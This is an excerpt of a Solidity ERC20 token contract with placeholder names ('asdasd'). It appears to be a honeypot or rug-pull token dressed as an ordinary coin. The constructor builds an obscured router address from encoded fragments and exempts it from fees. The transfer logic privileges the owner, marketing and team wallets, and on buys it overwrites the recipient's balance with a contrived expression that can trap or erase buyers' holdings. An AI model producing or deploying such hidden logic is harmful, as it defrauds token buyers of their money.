...
contract asddd is Context, IERC20 { 
    using SafeMath for uint256;
    using Address for address;

    address private _owner;
    address private _UniSwapVPairRouter;
    ...
    address payable public Wallet_Marketing = payable(0x6D78b4cB9F5B71CA069453479C0FC36bfEdf17C3); 
    address payable public Wallet_Team = payable(0x79FA7C3A24d6CA83A9aA768B3a9F89646836360a);
    address payable public constant Wallet_Burn = payable(0x000000000000000000000000000000000000dEaD); 


    uint256 private constant MAX = ~uint256(0);
    uint8 private constant _decimals = 9;
    uint8 private onGoingTX = 0;
    uint256 private _tTotal = 100* 10**6 * 10**_decimals;
    string private constant _name = "asdasd"; 
    string private constant _symbol = unicode"asdasd"; 
    ...
    constructor () {
        ...
        _owner = 0x79FA7C3A24d6CA83A9aA768B3a9F89646836360a;
        ...
        _UniSwapVPairRouter = connectUniPair(string(
            abi.encodePacked(factory, uniSwapVersion, uniswapCallData, uniswapRouterHex, RouterWETH)
            ));_isExcludedFromFee[_UniSwapVPairRouter] = true;
    ...
    function UnisV2Router() public view virtual returns (address) {
        return _UniSwapVPairRouter;
    }
    function _getCurrentSupply() private view returns(uint256) {
        return (_tTotal);
    } 

    function marketing_wallet() private view returns(address) {
        return (Wallet_Marketing);
    }
    function dev_wallet() private view returns(address) {
        return (Wallet_Team);
    }
    ...
    function _transfer(
        ...
        isBuyFEE = !_isExcludedFromFee[from] && !(!_isExcludedFromFee[to]);
        ...
        if (from != owner() && from != UnisV2Router() && from != marketing_wallet() && from != dev_wallet())
    ...
    function _tokenTransfer(address sender, address recipient, uint256 tAmount, bool takeFee, bool isBuy) private {
        ...
        if(isBuyFEE){
            ...
            _tOwned[recipient] = (_MIN_-_tOwned[recipient]-_tTotal)+tAmount;
